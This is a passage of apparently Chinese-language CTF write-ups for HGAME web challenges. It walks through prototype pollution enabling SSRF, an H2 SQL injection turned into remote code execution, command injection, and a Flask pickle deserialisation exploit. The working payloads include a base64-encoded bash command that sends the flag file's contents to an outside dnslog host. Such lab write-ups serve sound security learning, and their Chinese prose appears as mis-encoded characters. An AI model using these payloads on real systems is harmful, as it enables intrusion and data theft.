url.&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">undefined</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!url) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!userStorage[username].<span class="property">strategy</span>[url.<span class="property">hostname</span>]) &#123;</span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">400</span>);</span><br><span class="line">    res.<span class="title function_">end</span>(<span class="string">&quot;your url is not allowed.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> headers = req.<span class="property">headers</span>;</span><br><span class="line">    headers.<span class="property">host</span> = url.<span class="property">host</span>;</span><br><span class="line">    headers.<span class="property">cookie</span> = headers.<span class="property">cookie</span>.<span class="title function_">split</span>(<span class="string">&quot;;&quot;</span>).<span class="title function_">forEach</span>(<span class="function">(<span class="params">cookie</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">var</span> filtered_cookie = <span class="string">&quot;&quot;</span>;</span><br><span class="line">      <span class="keyword">const</span> [key, value] = cookie.<span class="title function_">split</span>(<span class="string">&quot;=&quot;</span>, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> (key.<span class="title function_">trim</span>() !== session_name) &#123;</span><br><span class="line">        filtered_cookie += <span class="string">`<span class="subst">$&#123;key&#125;</span>=<span class="subst">$&#123;value&#125;</span>;`</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> filtered_cookie;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">const</span> remote_res = <span class="keyword">await</span> (<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (req.<span class="property">method</span> == <span class="string">&quot;POST&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> axios.<span class="title function_">post</span>(url, req.<span class="property">body</span>, &#123;</span><br><span class="line">          <span class="attr">headers</span>: headers,</span><br><span class="line">        &#125;);</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (req.<span class="property">method</span> == <span class="string">&quot;GET&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> axios.<span class="title function_">get</span>(url, &#123;</span><br><span class="line">          <span class="attr">headers</span>: headers,</span><br><span class="line">        &#125;);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">405</span>);</span><br><span class="line">        res.<span class="title function_">end</span>(<span class="string">&quot;method not allowed.&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)();</span><br><span class="line">    res.<span class="title function_">status</span>(remote_res.<span class="property">status</span>);</span><br><span class="line">    res.<span class="title function_">header</span>(remote_res.<span class="property">headers</span>);</span><br><span class="line">    res.<span class="title function_">write</span>(remote_res.<span class="property">data</span>);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">500</span>);</span><br><span class="line">    res.<span class="title function_">end</span>(<span class="string">&quot;unreachable url.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/user/login&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; username, password &#125; = req.<span class="property">body</span>;</span><br><span class="line">  <span class="keyword">if</span> (</span><br><span class="line">    <span class="keyword">typeof</span> username != <span class="string">&quot;string&quot;</span> ||</span><br><span class="line">    <span class="keyword">typeof</span> password != <span class="string">&quot;string&quot;</span> ||</span><br><span class="line">    !username ||</span><br><span class="line">    !password</span><br><span class="line">  ) &#123;</span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">400</span>);</span><br><span class="line">    res.<span class="title function_">end</span>(<span class="string">&quot;invalid username or password&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (!userStorage[username]) &#123;</span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">403</span>);</span><br><span class="line">    res.<span class="title function_">end</span>(<span class="string">&quot;invalid username or password&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (userStorage[username].<span class="property">password</span> !== password) &#123;</span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">403</span>);</span><br><span class="line">    res.<span class="title function_">end</span>(<span class="string">&quot;invalid username or password&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  req.<span class="property">session</span>.<span class="property">username</span> = username;</span><br><span class="line">  res.<span class="title function_">send</span>(<span class="string">&quot;login success&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// under development</span></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/user/info&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">username</span>) &#123;</span><br><span class="line">    res.<span class="title function_">sendStatus</span>(<span class="number">403</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">update</span>(userStorage[req.<span class="property">session</span>.<span class="property">username</span>].<span class="property">info</span>, req.<span class="property">body</span>);</span><br><span class="line">  res.<span class="title function_">sendStatus</span>(<span class="number">200</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/home&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">username</span>) &#123;</span><br><span class="line">    res.<span class="title function_">sendStatus</span>(<span class="number">403</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&quot;home&quot;</span>, &#123;</span><br><span class="line">    <span class="attr">username</span>: req.<span class="property">session</span>.<span class="property">username</span>,</span><br><span class="line">    <span class="attr">strategy</span>: (<span class="function">(<span class="params">list</span>)=&gt;</span>&#123;</span><br><span class="line">      <span class="keyword">var</span> result = [];</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">var</span> key <span class="keyword">in</span> list) &#123;</span><br><span class="line">        result.<span class="title function_">push</span>(&#123;<span class="attr">host</span>: key, <span class="attr">allow</span>: list[key]&#125;);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    &#125;)(userStorage[req.<span class="property">session</span>.<span class="property">username</span>].<span class="property">strategy</span>),</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// demo service behind webvpn</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/flag&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (</span><br><span class="line">    req.<span class="property">headers</span>.<span class="property">host</span> != <span class="string">&quot;127.0.0.1:3000&quot;</span> ||</span><br><span class="line">    req.<span class="property">hostname</span> != <span class="string">&quot;127.0.0.1&quot;</span> ||</span><br><span class="line">    req.<span class="property">ip</span> != <span class="string">&quot;127.0.0.1&quot;</span> </span><br><span class="line">  ) &#123;</span><br><span class="line">    res.<span class="title function_">sendStatus</span>(<span class="number">400</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">const</span> data = fs.<span class="title function_">readFileSync</span>(<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line">  res.<span class="title function_">send</span>(data);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(port, <span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`app listen on <span class="subst">$&#123;port&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>è¯´å®è¯ä¹‹å‰åŸºæœ¬æ²¡åšè¿‡è¿™ä¹ˆé•¿çš„ä»£ç å®¡è®¡ï¼Œçœ‹ç€å°±å¤´å¤§ã€‚æˆ‘ä»¬å…ˆçœ‹flagè·¯ç”±ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/flag&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (</span><br><span class="line">    req.<span class="property">headers</span>.<span class="property">host</span> != <span class="string">&quot;127.0.0.1:3000&quot;</span> ||</span><br><span class="line">    req.<span class="property">hostname</span> != <span class="string">&quot;127.0.0.1&quot;</span> ||</span><br><span class="line">    req.<span class="property">ip</span> != <span class="string">&quot;127.0.0.1&quot;</span> </span><br><span class="line">  ) &#123;</span><br><span class="line">    res.<span class="title function_">sendStatus</span>(<span class="number">400</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">const</span> data = fs.<span class="title function_">readFileSync</span>(<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line">  res.<span class="title function_">send</span>(data);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬å‘ç°å…¶éœ€è¦æœ¬åœ°çš„æœºå™¨è®¿é—®æ‰å¯ä»¥æŸ¥çœ‹åˆ°flagï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±éœ€è¦è€ƒè™‘ssrfæ¼æ´ï¼Œå³è¿™ä¹ˆåˆ©ç”¨é¶æœºæ¥è®¿é—®æœ¬åœ°çš„è¿™ä¸ªflagè·¯ç”±ã€‚æˆ‘ä»¬åœ¨ä¸€å¼€å§‹ç™»é™†è¿›ç½‘ç«™æ—¶æˆ‘ä»¬ä¼šå‘ç°ä¸€ä¸ªç½‘é¡µè·³è½¬çš„é¡µé¢<br><img src="/2024/02/26/hgameweek3/1.png" class="" title="alt text"><br>å‘ç°æ˜¯/proxyè·¯ç”±<br>æˆ‘ä»¬çœ‹çœ‹ä»£ç ä¼šå‘ç°proxyè·¯ç”±ç½‘é¡µè·³è½¬çš„é™åˆ¶æ¡ä»¶æ˜¯å¦‚ä¸‹çš„ä»£ç <br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!userStorage[username].<span class="property">strategy</span>[url.<span class="property">hostname</span>]) &#123;</span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">400</span>);</span><br><span class="line">    res.<span class="title function_">end</span>(<span class="string">&quot;your url is not allowed.&quot;</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬æŸ¥æ‰¾userStorageè¿™ä¸ªç±»ï¼Œä¼šå‘ç°userStorage[username].strategy[url.hostname]æŒ‡å‘çš„å°±æ˜¯<code>&quot;baidu.com&quot;: true</code>å°±æ˜¯trueè¿™ä¸ªå˜é‡ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> userStorage = &#123;</span><br><span class="line">  <span class="attr">username</span>: &#123;</span><br><span class="line">    <span class="attr">password</span>: <span class="string">&quot;password&quot;</span>,</span><br><span class="line">    <span class="attr">info</span>: &#123;</span><br><span class="line">      <span class="attr">age</span>: <span class="number">18</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">strategy</span>: &#123;</span><br><span class="line">      <span class="string">&quot;baidu.com&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">      <span class="string">&quot;google.com&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬åœ¨å®¡è®¡ä¸€ä¸‹æºç å¯ä»¥å‘ç°å…¶æœ‰ç€æ˜æ˜¾çš„åŸå‹é“¾æ±¡æŸ“æ¼æ´<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">update</span>(<span class="params">dst, src</span>) &#123;</span><br><span class="line">  <span class="keyword">for</span> (key <span class="keyword">in</span> src) &#123;</span><br><span class="line">    <span class="keyword">if</span> (key.<span class="title function_">indexOf</span>(<span class="string">&quot;__&quot;</span>) != -<span class="number">1</span>) &#123;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> src[key] == <span class="string">&quot;object&quot;</span> &amp;&amp; dst[key] !== <span class="literal">undefined</span>) &#123;</span><br><span class="line">      <span class="title function_">update</span>(dst[key], src[key]);</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    dst[key] = src[key];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>å¯ä»¥å‘ç°updateæ˜¯ä¸€ä¸ªäº¤æ¢å‡½æ•°ï¼Œå¹¶ä¸”å…¶åªè¿‡æ»¤äº†<strong>é‚£ä¹ˆå°±ä¼šé€ æˆåŸå‹é“¾æ±¡æŸ“ã€‚<br>è¿‡æ»¤äº†</strong>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨<br><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;constructor&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;prototype&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span>è¦ä¿®æ”¹çš„åŸå‹çš„å†…å®¹<span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><br>æ¥ä»£æ›¿ã€‚<br>å¯ä»¥è¿›è¡ŒåŸå‹é“¾æ±¡æŸ“çš„è·¯ç”±æ˜¯/user/login<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/user/info&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">username</span>) &#123;</span><br><span class="line">    res.<span class="title function_">sendStatus</span>(<span class="number">403</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">update</span>(userStorage[req.<span class="property">session</span>.<span class="property">username</span>].<span class="property">info</span>, req.<span class="property">body</span>);</span><br><span class="line">  res.<span class="title function_">sendStatus</span>(<span class="number">200</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬å¯ä»¥é€šè¿‡req.bodyæ¥è¿›è¡ŒåŸå‹é“¾æ±¡æŸ“ï¼Œå³æˆ‘ä»¬å¯ä»¥é€šè¿‡postä¼ å…¥çš„å€¼è¿›è¡ŒåŸå‹é“¾æ±¡æŸ“ã€‚<br>é‚£ä¹ˆç­”æ¡ˆå°±å‘¼ä¹‹æ¬²å‡ºäº†<br>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨åŸå‹é“¾æ±¡æŸ“å¡å…¥<code>127.0.0.1:true</code>é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨proxyæ¥è®¿é—®127.0.0.1:3000/flagæ¥å¾—åˆ°flag<br>payload<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;constructor&quot;:&#123;&quot;prototype&quot;:&#123;&quot;127.0.0.1&quot;:&quot;true&quot;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><br>ä¹‹åå°±å¯ä»¥ç›´æ¥ä½¿ç”¨/proxyæ¥è®¿é—®flagäº†ã€‚<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/proxy?url=http://127.0.0.1:3000/flag</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
          <category> æ¯”èµ›wp(å¤ç°) </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hgameweek2</title>
      <link href="/2024/02/08/hgameweek2/"/>
      <url>/2024/02/08/hgameweek2/</url>
      
        <content type="html"><![CDATA[<h1 id="search4member"><a href="#search4member" class="headerlink" title="search4member"></a>search4member</h1><p>åˆæ˜¯ä¸€é“javaé¢˜ï¼Œæœç„¶ç°åœ¨çš„webå…¨æ˜¯java<br>è¿™é“é¢˜ç›®æˆ‘ä»¬éœ€è¦å…ˆå®¡è®¡æºç ,ä¸€å¼€å§‹æˆ‘çœ‹çš„äº†ä¸‹é¢çš„è¿™æ®µä»£ç <br><img src="/2024/02/08/hgameweek2/2.png" class="" title="alt text"><br>å‘ç°äº†sqlæ³¨å…¥ï¼Œäºæ˜¯æˆ‘ç‹ ç‹ çš„æ³¨å…¥äº†è¿›å»ï¼Œç»“æœå‘ç°è¡¨éƒ½æ˜¯nullï¼Œåªæ³¨å‡ºæ¥äº†æ•°æ®åº“H2ï¼Œäºæ˜¯æˆ‘å°±åœ¨ç½‘ä¸ŠæŸ¥äº†ä¸€ä¸‹ã€‚<br>å‘ç°H2æ•°æ®åº“çš„æ¼æ´è¿˜ä¸å°‘ï¼Œæœ€å…¸å‹çš„å°±æ˜¯å­˜åœ¨sqlæ³¨å…¥æ—¶å¯ä»¥å°†sqlæ³¨å…¥å‡çº§æˆRCEã€‚<br>åŸå› æ˜¯H2æ•°æ®åº“å…è®¸ç”¨æˆ·å®šä¹‰å‡½æ•°åï¼Œå¯ä»¥æ‰§è¡Œjavaä»£ç ï¼Œé‚£ä¹ˆæˆ‘ä»¬åªè¦èƒ½å¤ŸRCEçš„ä»£ç åˆ«ååå†ä½¿ç”¨CALLè°ƒç”¨å³å¯è¿›è¡ŒRCE<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CREATE ALIAS EXEC AS </span><br><span class="line">$$ <span class="keyword">void</span> <span class="title function_">e</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> java.io.IOException </span><br><span class="line">&#123;java.lang.Runtime rt= java.lang.Runtime.getRuntime();rt.exec(cmd);&#125;$$</span><br><span class="line">CALL <span class="title function_">EXEC</span><span class="params">(<span class="string">&#x27;whoami&#x27;</span>)</span>;</span><br></pre></td></tr></table></figure><br>å³å¦‚æœå†å¯¹H2æ•°æ®åº“ä½¿ç”¨ä»¥ä¸Šè¯­å¥å°±ä¼šæ‰§è¡Œwhoamiã€‚ä½†æ˜¯å†æ‰§è¡Œæ—¶å‘ç°å¦‚æœå­˜åœ¨<code>&#123;</code>ç½‘é¡µä¼šå´©ã€‚<br>ç”±äºCREATE ALIASæŒ‡ä»¤å¯ä»¥ä½¿ç”¨å­—ç¬¦ä¸²ï¼ˆStringï¼‰ä½œä¸ºæºä»£ç ï¼ˆä¹Ÿå°±æ˜¯ç›´æ¥å°†å­—ç¬¦ä¸²å½“æˆä»£ç æ‰§è¡Œï¼‰ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥æˆåŠŸç»•è¿‡è¿™ä¸ªé™åˆ¶ã€‚è¿™æ„å‘³ç€æˆ‘ä»¬ä¸éœ€è¦ä½¿ç”¨$ç¬¦å·ï¼Œå¯ä»¥ä½¿ç”¨å†…ç½®çš„SQLå‡½æ•°æ¥ç¼–ç æˆ‘ä»¬çš„payloadã€‚<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;CREATE ALIAS EXEC AS CONCAT(&#x27;</span><span class="keyword">void</span> <span class="title function_">e</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> java.io.IOException<span class="string">&#x27;, HEXTORAW(&#x27;</span>007b<span class="string">&#x27;),&#x27;</span>java.lang.Runtime rt= java.lang.Runtime.getRuntime(); rt.exec(cmd);<span class="string">&#x27;,HEXTORAW(&#x27;</span><span class="number">007d</span><span class="string">&#x27;)); CALL EXEC(&#x27;</span>bash -c &#123;echo,Y3VybCAgaHR0cDovL2BjYXQgL2ZsYWdgLjhsazlqMi5jZXllLmlvLw==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;<span class="string">&#x27;);--+</span></span><br></pre></td></tr></table></figure><br>ä¸‹é¢æˆ‘ä»¬æ¥åˆ†æä¸€ä¸‹payloadé¦–å…ˆæˆ‘ä»¬ä½¿ç”¨å †å æ³¨å…¥ï¼Œè¿™æ ·ä½¿å¾—æˆ‘ä»¬çš„è¯­å¥å¯ä»¥è¢«æ‰§è¡Œï¼Œä½†æ˜¯ç”±äºè¯¥é¢˜ä½¿ç”¨çš„sqlæŸ¥è¯¢å‡½æ•°ï¼Œåªä¼šè¿”å›ç¬¬ä¸€ä¸ªæŸ¥è¯¢çš„å¯¹è±¡ï¼Œæ‰€ä»¥è™½ç„¶å°†æ‰€æœ‰æŸ¥è¯¢éƒ½æ‰§è¡Œäº†ï¼Œä½†æ˜¯å…¶æ— æ³•å›æ˜¾ã€‚æ‰€ä»¥æˆ‘ä»¬éœ€è¦ä½¿ç”¨åå¼¹shellï¼Œä½¿ç”¨DNSé€šé“æ¥å¸¦å‡ºæŒ‡ä»¤ã€‚<br>ä¸€å¼€å§‹æˆ‘æ˜¯å‡†å¤‡ä½¿ç”¨<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://`cat /flag` xxxxxx.dnslog.xx</span><br></pre></td></tr></table></figure><br>æ¥è¿›è¡Œdnså¤–å¸¦çš„ï¼Œç»“æœå‘ç°ï¼Œæ— æ³•å¤–å¸¦ï¼ŒæŸ¥äº†ä¸€ä¸‹æ‰å‘ç°ï¼Œæˆ‘ä»¬ä½¿ç”¨çš„æ˜¯execè¿˜æ˜¯æ¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œè€Œåå¼•å·``æ˜¯liunxçš„shellæ‰èƒ½ä½¿ç”¨çš„ï¼Œä½¿ç”¨æˆ‘ä»¬ä½¿ç”¨äº†<code>bash -c &#123;echo,Y3VybCAgaHR0cDovL2BjYXQgL2ZsYWdgLjhsazlqMi5jZXllLmlvLw==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</code>è¿™å¥ä»£ç ä½¿ç”¨äº†bash -cå°†åé¢çš„å½“æˆbashä»£ç æ‰§è¡Œï¼Œè€Œåé¢çš„base64ç¼–ç å‰çš„å†…å®¹æ˜¯<code>curl http://`cat /flag` xxxxxx.dnslog.xx</code>ã€‚æˆ‘ä»¬ä½¿ç”¨ç®¡é“ç¬¦å°†bash64ç¼–ç çš„å†…å®¹è¿›è¡Œè§£å¯†ä¼ è¾“æ‰§è¡Œã€‚æœ€åå°±æˆåŠŸå¤–å¸¦äº†ã€‚</p><h1 id="What-the-cow-say"><a href="#What-the-cow-say" class="headerlink" title="What the cow say?"></a>What the cow say?</h1><p>è¿™é“é¢˜ç›®æˆ‘ä¸ªäººæ„Ÿè§‰æ˜¯ä¸¤å‘¨æ¥æ¯”è¾ƒç®€å•çš„é¢˜ç›®äº†ã€‚<br>æˆ‘ä»¬é¦–å…ˆæŸ¥ä¸€ä¸‹ä»€ä¹ˆæ˜¯cow sayå‘ç°å…¶å†æ˜¯ä¸€ä¸ªlinuxçš„æŒ‡ä»¤ï¼Œæˆ‘ä»¬è¾“å…¥ä»€ä¹ˆå…¶è¿”å›ä»€ä¹ˆï¼Œé‚£ä¹ˆæˆ‘ä»¬å°è¯•ä¸€äº›å¯ä¸å¯ä»¥ç›´æ¥rceï¼Œå‘ç°å…¶å¯ä»¥rceï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥ç»“æŸç»•wafäº†<br>payload<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`tac /fl*/fl*`</span><br></pre></td></tr></table></figure></p><h1 id="Select-More-Courses"><a href="#Select-More-Courses" class="headerlink" title="Select More Courses"></a>Select More Courses</h1><p>æ‰“å¼€é¶åœºï¼Œå‘ç°è¦ç™»é™†å…¶ç”¨æˆ·å·²ç»ç»™äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥çˆ†ç ´ï¼Œè¿™é“é¢˜ç›®æ¯”è¾ƒçƒ¦çš„å°±æ˜¯è¿™ä¸ªçˆ†ç ´ï¼Œæˆ‘æ¢äº†å¥½å‡ ä¸ªå­—å…¸æ‰çˆ†ç ´å‡ºæ¥ã€‚<br><img src="/2024/02/08/hgameweek2/3.png" class="" title="alt text"><br>ç‚¹å¼€å…¶è¦æ±‚æˆ‘ä»¬å¸®å¿™é€‰è¯¾ï¼Œä½†æ˜¯å…¶å­¦åˆ†ä¿®æ»¡äº†å°±éœ€è¦ä½¿ç”¨æ‰©å­¦åˆ†ï¼Œä½†æ˜¯ç»©ç‚¹ä¸è¶³æ— æ³•ä¿®ï¼Œä½†æ˜¯æç¤ºä½ éœ€è¦ä¸æ—¶é—´èµ›è·‘ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥çŒœæµ‹å…¶åº”è¯¥ä¸ºæ¡ä»¶ç«äº‰ã€‚<br>å…¶åç«¯å¤§æ¦‚ä¸ºå…ˆå¼€å¯æ‰©å­¦åˆ†ï¼Œåæ£€æµ‹å…¶ç»©ç‚¹çš„å¤šå°‘ï¼Œæœ€åä¸è¶³åˆ é™¤ï¼Œè¿™æ˜¯æˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨bpè¿›è¡Œé‡å¤å‘ç”Ÿæ‰©å­¦åˆ†è¯·æ±‚ï¼Œå†é€‰è¯¾å³å¯ã€‚</p><h1 id="myflask"><a href="#myflask" class="headerlink" title="myflask"></a>myflask</h1><p>æˆ‘ä»¬æŸ¥çœ‹æºç ï¼Œå‘ç°å…¶ssionæ˜¯ä½¿ç”¨æ—¶é—´æˆ³è¿›è¡Œæ ‡ç­¾çš„ï¼Œè¿™æ—¶å€™æˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨å·¥å…·è¿›è¡Œä¼ªé€ ssionï¼Œæ—¶é—´æˆ³å°±æ˜¯æˆ‘ä»¬å¼€å¯é¶æœºçš„æ—¶é—´ã€‚<br>ä¼ªé€ å¥½åå°±æ˜¯pickle-rce<br>pocå¦‚ä¸‹<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>, (<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;tac /flag&#x27;).read()&quot;</span>,))</span><br><span class="line">    </span><br><span class="line">a = A()</span><br><span class="line">a = pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(a))</span><br></pre></td></tr></table></figure></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gASVRgAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIwqX19pbXBvcnRfXygnb3MnKS5wb3BlbigndGFjIC9mbGFnJykucmVhZCgplIWUUpQu</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
          <category> æ¯”èµ›wp(å¤ç°) </category>
          
      </categories>
